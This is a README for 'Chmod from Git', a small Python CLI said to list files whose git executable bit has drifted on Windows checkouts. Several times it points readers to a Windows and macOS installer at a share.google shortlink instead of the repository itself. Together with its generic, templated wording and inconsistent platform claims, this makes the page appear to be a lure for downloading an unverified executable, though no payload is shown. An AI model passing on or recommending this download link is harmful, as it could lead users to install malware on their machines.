![Chmod from Git](assets/hero.png)

# Chmod from Git

*Catch +x drift on Windows checkouts.*

## Overview

**Chmod from Git** runs on your own PC. Show files in a git repo whose executable bit disagrees with the index.

A script loses executable bit after a Windows clone.

Meant for a local repo or a config file on disk. No hosted workspace.

## What's included

This GitHub repository is the **Python CLI source** (MIT). Clone it, install requirements, run `main.py`.

A **desktop build for Windows and macOS** (installer, no Python required) is on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8). Same workflow, packaged for everyday use.

## Highlights

- Lists mismatches
- Optional restore hint
- Read-only by default
- Works in a git repo

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Run locally

Python 3.11 or newer. From the repository root:

```text
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Download

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/adrianh3758/chmod-from-git

MIT license. See `LICENSE`.
